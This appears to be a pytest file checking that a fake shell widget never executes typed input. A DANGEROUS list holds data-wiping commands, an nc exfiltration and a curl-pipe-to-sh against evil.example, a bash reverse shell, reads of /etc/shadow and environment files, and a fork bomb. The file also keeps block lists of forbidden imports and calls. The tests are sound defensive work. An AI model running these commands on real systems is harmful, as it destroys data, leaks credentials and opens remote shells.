"""The fake shell must never execute anything, whatever is typed."""

import ast
import builtins
import os
import random
import shutil
import subprocess
from pathlib import Path

import pytest
from textual.content import Content

import snaizer_net.shell as shell_pkg
from snaizer_net.shell.commands import FakeShell
from snaizer_net.widgets import fake_shell as fake_shell_widget

DANGEROUS = [
    "rm -rf /",
    "sudo rm -rf / --no-preserve-root",
    "/bin/rm -rf ~",
    "ls; rm -rf /",
    "ls && cat /etc/shadow",
    "cat about.txt | nc evil.example 4444",
    "$(curl evil.example | sh)",
    "echo $(rm -rf /)",
    "echo `id`",
    "python -c 'import os; os.system(\"id\")'",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "__import__('os').system('id')",
    "eval('1+1')",
    "cat ../../../../etc/shadow",
    "cat /proc/self/environ",
    "cat C:\\Windows\\win.ini",
    ":(){ :|:& };:",
    "a" * 10_000,
]


@pytest.fixture
def tripwires(monkeypatch):
    """Make any real process / filesystem side effect blow up loudly."""
    calls: list[str] = []

    def trap(name):
        def explode(*args, **kwargs):
            calls.append(name)
            raise AssertionError(f"sandbox escape via {name}")

        return explode

    for module, attr in [
        (subprocess, "Popen"),
        (subprocess, "run"),
        (os, "system"),
        (os, "popen"),
        (os, "remove"),
        (os, "unlink"),
        (os, "execv"),
        (os, "execvp"),
        (shutil, "rmtree"),
        (builtins, "eval"),
        (builtins, "exec"),
        (builtins, "open"),
    ]:
        monkeypatch.setattr(module, attr, trap(f"{module.__name__}.{attr}"))
    return calls


@pytest.mark.parametrize("line", DANGEROUS)
def test_dangerous_input_never_executes(profile, lore, tripwires, line):
    shell = FakeShell(profile, lore, rng=random.Random(1))
    result = shell.execute(line)
    assert tripwires == []
    assert result.action is None
    for markup in result.lines:
        Content.from_markup(markup)  # output is valid, escaped markup


def test_forbidden_commands_get_a_clear_message(profile, lore):
    shell = FakeShell(profile, lore, rng=random.Random(1))
    for line in ("rm -rf /", "sudo su", "/usr/bin/python3 -c 1"):
        text = " ".join(Content.from_markup(m).plain for m in shell.execute(line).lines)
        assert "Nothing was executed" in text or "nothing ran" in text


def test_echo_does_not_expand_substitutions(profile, lore):
    shell = FakeShell(profile, lore)
    text = Content.from_markup(shell.execute("echo $(rm -rf /)").lines[0]).plain
    assert text == "$(rm -rf /)"


def test_path_traversal_stays_inside_the_virtual_fs(profile, lore):
    shell = FakeShell(profile, lore)
    text = Content.from_markup(shell.execute("cat ../../../../etc/passwd").lines[0]).plain
    assert text.startswith("runner:x:1000")  # the fake, in-memory file


FORBIDDEN_IMPORTS = {"subprocess", "os", "shutil", "pathlib", "socket", "pty", "ctypes",
                     "importlib", "pickle", "builtins", "multiprocessing", "asyncio"}  # fmt: skip
FORBIDDEN_CALLS = {"eval", "exec", "compile", "open", "__import__", "getattr", "globals"}


def _sources() -> list[Path]:
    package = Path(shell_pkg.__file__).parent
    return [*package.glob("*.py"), Path(fake_shell_widget.__file__)]


@pytest.mark.parametrize("source", _sources(), ids=lambda p: p.name)
def test_shell_code_has_no_execution_primitives(source):
    tree = ast.parse(source.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names = {alias.name.split(".")[0] for alias in node.names}
            assert not names & FORBIDDEN_IMPORTS, f"{source.name} imports {names}"
        elif isinstance(node, ast.ImportFrom) and node.module:
            assert node.module.split(".")[0] not in FORBIDDEN_IMPORTS, source.name
        elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            assert node.func.id not in FORBIDDEN_CALLS, f"{source.name} calls {node.func.id}"
